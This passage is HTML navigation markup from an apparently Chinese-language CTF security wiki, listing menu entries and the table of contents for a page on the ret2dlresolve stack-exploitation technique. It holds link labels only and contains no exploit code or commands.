href=../../../../../crypto/hash/attack/ class=md-nav__link> Hash Attack </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../crypto/hash/complex/ class=md-nav__link> 综合题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8 type=checkbox id=nav-3-8> <label class=md-nav__link for=nav-3-8> 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=数字签名 data-md-level=2> <label class=md-nav__title for=nav-3-8> <span class="md-nav__icon md-icon"></span> 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/signature/introduction/ class=md-nav__link> 数字签名 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8-2 type=checkbox id=nav-3-8-2> <label class=md-nav__link for=nav-3-8-2> RSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="RSA 数字签名" data-md-level=3> <label class=md-nav__title for=nav-3-8-2> <span class="md-nav__icon md-icon"></span> RSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/signature/rsa/ class=md-nav__link> RSA 数字签名 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8-3 type=checkbox id=nav-3-8-3> <label class=md-nav__link for=nav-3-8-3> ElGamal 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ElGamal 数字签名" data-md-level=3> <label class=md-nav__title for=nav-3-8-3> <span class="md-nav__icon md-icon"></span> ElGamal 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/signature/elgamal/ class=md-nav__link> ElGamal </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8-4 type=checkbox id=nav-3-8-4> <label class=md-nav__link for=nav-3-8-4> DSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="DSA 数字签名" data-md-level=3> <label class=md-nav__title for=nav-3-8-4> <span class="md-nav__icon md-icon"></span> DSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/signature/dsa/ class=md-nav__link> DSA </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-9 type=checkbox id=nav-3-9> <label class=md-nav__link for=nav-3-9> 攻击思想总结 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=攻击思想总结 data-md-level=2> <label class=md-nav__title for=nav-3-9> <span class="md-nav__icon md-icon"></span> 攻击思想总结 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/attack-summary/attack-mode/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-9-2 type=checkbox id=nav-3-9-2> <label class=md-nav__link for=nav-3-9-2> 中间相遇攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=中间相遇攻击 data-md-level=3> <label class=md-nav__title for=nav-3-9-2> <span class="md-nav__icon md-icon"></span> 中间相遇攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/attack-summary/meet-in-the-middle/ class=md-nav__link> 中间相遇攻击 - MITM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-9-3 type=checkbox id=nav-3-9-3> <label class=md-nav__link for=nav-3-9-3> 比特攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=比特攻击 data-md-level=3> <label class=md-nav__title for=nav-3-9-3> <span class="md-nav__icon md-icon"></span> 比特攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/attack-summary/bit-attack/ class=md-nav__link> 比特攻击 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-10 type=checkbox id=nav-3-10> <label class=md-nav__link for=nav-3-10> 证书格式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=证书格式 data-md-level=2> <label class=md-nav__title for=nav-3-10> <span class="md-nav__icon md-icon"></span> 证书格式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../crypto/certificate/introduction/ class=md-nav__link> 证书格式 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4 type=checkbox id=nav-4> <label class=md-nav__link for=nav-4> Web <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=1> <label class=md-nav__title for=nav-4> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../web/introduction/ class=md-nav__link> Web 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-2 type=checkbox id=nav-4-2> <label class=md-nav__link for=nav-4-2> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SQL 注入" data-md-level=2> <label class=md-nav__title for=nav-4-2> <span class="md-nav__icon md-icon"></span> SQL 注入 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../web/sqli/ class=md-nav__link> SQL 注入 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-3 type=checkbox id=nav-4-3> <label class=md-nav__link for=nav-4-3> XSS 跨站脚本攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="XSS 跨站脚本攻击" data-md-level=2> <label class=md-nav__title for=nav-4-3> <span class="md-nav__icon md-icon"></span> XSS 跨站脚本攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../web/xss/ class=md-nav__link> XSS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4 type=checkbox id=nav-4-4> <label class=md-nav__link for=nav-4-4> CSRF 跨站请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="CSRF 跨站请求伪造" data-md-level=2> <label class=md-nav__title for=nav-4-4> <span class="md-nav__icon md-icon"></span> CSRF 跨站请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../web/csrf/ class=md-nav__link> CSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5 type=checkbox id=nav-4-5> <label class=md-nav__link for=nav-4-5> SSRF 服务端请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SSRF 服务端请求伪造" data-md-level=2> <label class=md-nav__title for=nav-4-5> <span class="md-nav__icon md-icon"></span> SSRF 服务端请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../web/ssrf/ class=md-nav__link> SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6 type=checkbox id=nav-4-6> <label class=md-nav__link for=nav-4-6> PHP 代码审计 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="PHP 代码审计" data-md-level=2> <label class=md-nav__title for=nav-4-6> <span class="md-nav__icon md-icon"></span> PHP 代码审计 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../web/php/php/ class=md-nav__link> PHP 代码审计 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5 type=checkbox id=nav-5> <label class=md-nav__link for=nav-5> Assembly <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Assembly data-md-level=1> <label class=md-nav__title for=nav-5> <span class="md-nav__icon md-icon"></span> Assembly </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../assembly/x86-x64/readme/ class=md-nav__link> x86_x64 </a> </li> <li class=md-nav__item> <a href=../../../../../assembly/mips/readme/ class=md-nav__link> MIPS </a> </li> <li class=md-nav__item> <a href=../../../../../assembly/arm/readme/ class=md-nav__link> ARM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6 type=checkbox id=nav-6> <label class=md-nav__link for=nav-6> Executable <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Executable data-md-level=1> <label class=md-nav__title for=nav-6> <span class="md-nav__icon md-icon"></span> Executable </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6-1 type=checkbox id=nav-6-1> <label class=md-nav__link for=nav-6-1> ELF 文件 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件" data-md-level=2> <label class=md-nav__title for=nav-6-1> <span class="md-nav__icon md-icon"></span> ELF 文件 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6-1-1 type=checkbox id=nav-6-1-1> <label class=md-nav__link for=nav-6-1-1> ELF 文件基本结构 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件基本结构" data-md-level=3> <label class=md-nav__title for=nav-6-1-1> <span class="md-nav__icon md-icon"></span> ELF 文件基本结构 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/basic-info/ class=md-nav__link> ELF 文件 </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/sections/ class=md-nav__link> Sections </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/code-sections/ class=md-nav__link> Code Section </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/data-related-sections/ class=md-nav__link> Data Related Sections </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/symbol-table/ class=md-nav__link> .symtab: Symbol Table </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/strings-sections/ class=md-nav__link> String Sections </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/dynamic-sections/ class=md-nav__link> Dynamic Sections </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/structure/misc-sections/ class=md-nav__link> Misc Sections </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6-1-2 type=checkbox id=nav-6-1-2> <label class=md-nav__link for=nav-6-1-2> 程序加载 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序加载 data-md-level=3> <label class=md-nav__title for=nav-6-1-2> <span class="md-nav__icon md-icon"></span> 程序加载 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../executable/elf/program-loading/ class=md-nav__link> 程序加载 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6-1-3 type=checkbox id=nav-6-1-3> <label class=md-nav__link for=nav-6-1-3> 程序链接 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序链接 data-md-level=3> <label class=md-nav__title for=nav-6-1-3> <span class="md-nav__icon md-icon"></span> 程序链接 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../executable/elf/linking/program-linking/ class=md-nav__link> 程序链接 </a> </li> <li class=md-nav__item> <a href=../../../../../executable/elf/linking/symbol-resolve/ class=md-nav__link> Symbol Reslove </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6-1-4 type=checkbox id=nav-6-1-4> <label class=md-nav__link for=nav-6-1-4> 程序执行流程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序执行流程 data-md-level=3> <label class=md-nav__title for=nav-6-1-4> <span class="md-nav__icon md-icon"></span> 程序执行流程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../executable/elf/running-overview/ class=md-nav__link> 程序执行流程 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7 type=checkbox id=nav-7> <label class=md-nav__link for=nav-7> Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Reverse data-md-level=1> <label class=md-nav__title for=nav-7> <span class="md-nav__icon md-icon"></span> Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1 type=checkbox id=nav-7-1> <label class=md-nav__link for=nav-7-1> Reverse Overview <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Reverse Overview" data-md-level=2> <label class=md-nav__title for=nav-7-1> <span class="md-nav__icon md-icon"></span> Reverse Overview </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../reverse/introduction/ class=md-nav__link> 软件逆向工程简介 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/identify-encode-encryption/introduction/ class=md-nav__link> 常见加密算法和编码识别 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/maze/maze/ class=md-nav__link> Maze </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/vm/vm/ class=md-nav__link> 虚拟机分析 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/unicorn/introduction/ class=md-nav__link> Introduction </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-2 type=checkbox id=nav-7-2> <label class=md-nav__link for=nav-7-2> Linux Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Reverse" data-md-level=2> <label class=md-nav__title for=nav-7-2> <span class="md-nav__icon md-icon"></span> Linux Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../reverse/linux/ld_preload/ class=md-nav__link> LD_PRELOAD </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/linux/false-disasm/ class=md-nav__link> False Disassembly </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/linux/detect-bp/ class=md-nav__link> Detecting Breakpoints </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/linux/detect-dbg/ class=md-nav__link> Detecting debugging </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-3 type=checkbox id=nav-7-3> <label class=md-nav__link for=nav-7-3> Windows Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Reverse" data-md-level=2> <label class=md-nav__title for=nav-7-3> <span class="md-nav__icon md-icon"></span> Windows Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-3-1 type=checkbox id=nav-7-3-1> <label class=md-nav__link for=nav-7-3-1> 脱壳技术 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=脱壳技术 data-md-level=3> <label class=md-nav__title for=nav-7-3-1> <span class="md-nav__icon md-icon"></span> 脱壳技术 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/packer-introduction/ class=md-nav__link> 保护壳简介 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/trace/ class=md-nav__link> 单步跟踪法 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/esp/ class=md-nav__link> ESP 定律法 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/direct-oep/ class=md-nav__link> 一步到达 OEP 法 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/memory/ class=md-nav__link> 内存镜像法 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/last-exception/ class=md-nav__link> 最后一次异常法 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/sfx/ class=md-nav__link> SFX 法 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/fix-iat/ class=md-nav__link> DUMP 及 IAT 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/manually-fix-iat/ class=md-nav__link> 手动查找 IAT 并使用 ImportREC 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/unpack/unpack-dll/ class=md-nav__link> DLL 文件脱壳 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-3-2 type=checkbox id=nav-7-3-2> <label class=md-nav__link for=nav-7-3-2> 反调试技术 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反调试技术 data-md-level=3> <label class=md-nav__title for=nav-7-3-2> <span class="md-nav__icon md-icon"></span> 反调试技术 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/ntglobalflag/ class=md-nav__link> NtGlobalFlag </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/heap-flags/ class=md-nav__link> Heap Flags </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/the-heap/ class=md-nav__link> The Heap </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/int-3/ class=md-nav__link> Interrupt 3 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/isdebuggerpresent/ class=md-nav__link> IsDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/checkremotedebuggerpresent/ class=md-nav__link> CheckRemoteDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/ntqueryinformationprocess/ class=md-nav__link> NtQueryInformationProcess </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/zwsetinformationthread/ class=md-nav__link> ZwSetInformationThread </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../reverse/windows/anti-debug/example/ class=md-nav__link> 反调试技术例题 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8 type=checkbox id=nav-8 checked> <label class=md-nav__link for=nav-8> Pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pwn data-md-level=1> <label class=md-nav__title for=nav-8> <span class="md-nav__icon md-icon"></span> Pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-1 type=checkbox id=nav-8-1> <label class=md-nav__link for=nav-8-1> Pwn Overview <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Pwn Overview" data-md-level=2> <label class=md-nav__title for=nav-8-1> <span class="md-nav__icon md-icon"></span> Pwn Overview </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../readme/ class=md-nav__link> Pwn Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2 type=checkbox id=nav-8-2 checked> <label class=md-nav__link for=nav-8-2> Linux Pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Pwn" data-md-level=2> <label class=md-nav__title for=nav-8-2> <span class="md-nav__icon md-icon"></span> Linux Pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-1 type=checkbox id=nav-8-2-1> <label class=md-nav__link for=nav-8-2-1> 安全防护机制 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=安全防护机制 data-md-level=3> <label class=md-nav__title for=nav-8-2-1> <span class="md-nav__icon md-icon"></span> 安全防护机制 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../mitigation/canary/ class=md-nav__link> Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-2 type=checkbox id=nav-8-2-2 checked> <label class=md-nav__link for=nav-8-2-2> 栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=栈溢出 data-md-level=3> <label class=md-nav__title for=nav-8-2-2> <span class="md-nav__icon md-icon"></span> 栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../stack-intro/ class=md-nav__link> Stack intro </a> </li> <li class=md-nav__item> <a href=../../stackoverflow-basic/ class=md-nav__link> Stackoverflow basic </a> </li> <li class=md-nav__item> <a href=../../basic-rop/ class=md-nav__link> Basic rop </a> </li> <li class=md-nav__item> <a href=../../medium-rop/ class=md-nav__link> 中级ROP </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-2-5 type=checkbox id=nav-8-2-2-5 checked> <label class=md-nav__link for=nav-8-2-2-5> 高级 ROP <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="高级 ROP" data-md-level=4> <label class=md-nav__title for=nav-8-2-2-5> <span class="md-nav__icon md-icon"></span> 高级 ROP </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../advanced-rop/ class=md-nav__link> 高级 ROP </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> ret2dlresolve <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> ret2dlresolve </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 原理 </a> <nav class=md-nav aria-label=原理> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1- class=md-nav__link> 思路1 - 直接控制重定位表项的相关内容 </a> </li> <li class=md-nav__item> <a href=#2- class=md-nav__link> 思路2 - 间接控制重定位表项的相关内容 </a> </li> <li class=md-nav__item> <a href=#3-link_map class=md-nav__link> 思路3 - 伪造 link_map </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#32 class=md-nav__link> 32 位例子 </a> <nav class=md-nav aria-label="32 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 手工伪造 </a> <nav class=md-nav aria-label=手工伪造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#stage-1 class=md-nav__link> stage 1 </a> </li> <li class=md-nav__item> <a href=#stage-2 class=md-nav__link> stage 2 </a> </li> <li class=md-nav__item> <a href=#stage-3 class=md-nav__link> stage 3 </a> </li> <li class=md-nav__item> <a href=#stage-4 class=md-nav__link> stage 4 </a> </li> <li class=md-nav__item> <a href=#stage-5 class=md-nav__link> stage 5 </a> </li> <li class=md-nav__item> <a href=#stage-6 class=md-nav__link> stage 6 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 基于工具伪造 </a> <nav class=md-nav aria-label=基于工具伪造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#roputil class=md-nav__link> Roputil </a> </li> <li class=md-nav__item> <a href=#pwntools class=md-nav__link> pwntools </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#64 class=md-nav__link> 64 位例子 </a> <nav class=md-nav aria-label="64 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro_1 class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro_1 class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 手工伪造 </a> <nav class=md-nav aria-label=手工伪造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#64_1 class=md-nav__link> 64 位的变化 </a> </li> <li class=md-nav__item> <a href=#first-try-leak class=md-nav__link> First Try - leak </a> </li> <li class=md-nav__item> <a href=#second-try-no-leak class=md-nav__link> Second try - no leak </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 基于工具伪造 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro_1 class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-readable class=md-nav__link> 2015-hitcon-readable </a> <nav class=md-nav aria-label=2015-hitcon-readable> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1modify-dynamic-section class=md-nav__link> 方法1：modify dynamic section </a> </li> <li class=md-nav__item> <a href=#2-rop class=md-nav__link> 方法 2 - 标准 ROP </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-quals-blinkroot class=md-nav__link> 2015-hitcon-quals-blinkroot </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 总结 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 题目 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 参考 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../ret2vdso/ class=md-nav__link> ret2VDSO </a> </li> <li class=md-nav__item> <a href=../srop/ class=md-nav__link> SROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-2-6 type=checkbox id=nav-8-2-2-6> <label class=md-nav__link for=nav-8-2-2-6> 花式栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=花式栈溢出 data-md-level=4> <label class=md-nav__title for=nav-8-2-2-6> <span class="md-nav__icon md-icon"></span> 花式栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../fancy-rop/ class=md-nav__link> Fancy rop </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-3 type=checkbox id=nav-8-2-3> <label class=md-nav__link for=nav-8-2-3> 格式化字符串漏洞 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格式化字符串漏洞 data-md-level=3> <label class=md-nav__title for=nav-8-2-3> <span class="md-nav__icon md-icon"></span> 格式化字符串漏洞 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr_intro/ class=md-nav__link> Fmtstr intro </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr_exploit/ class=md-nav__link> Fmtstr exploit </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr_example/ class=md-nav__link> Fmtstr example </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr_detect/ class=md-nav__link> Fmtstr detect </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-4 type=checkbox id=nav-8-2-4> <label class=md-nav__link for=nav-8-2-4> Glibc Heap 利用 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Glibc Heap 利用" data-md-level=3> <label class=md-nav__title for=nav-8-2-4> <span class="md-nav__icon md-icon"></span> Glibc Heap 利用 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../glibc-heap/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/heap_overview/ class=md-nav__link> 堆概述 </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/heap_structure/ class=md-nav__link> Heap structure </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-4-4 type=checkbox id=nav-8-2-4-4> <label class=md-nav__link for=nav-8-2-4-4> 深入理解 Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="深入理解 Ptmalloc2" data-md-level=4> <label class=md-nav__title for=nav-8-2-4-4> <span class="md-nav__icon md-icon"></span> 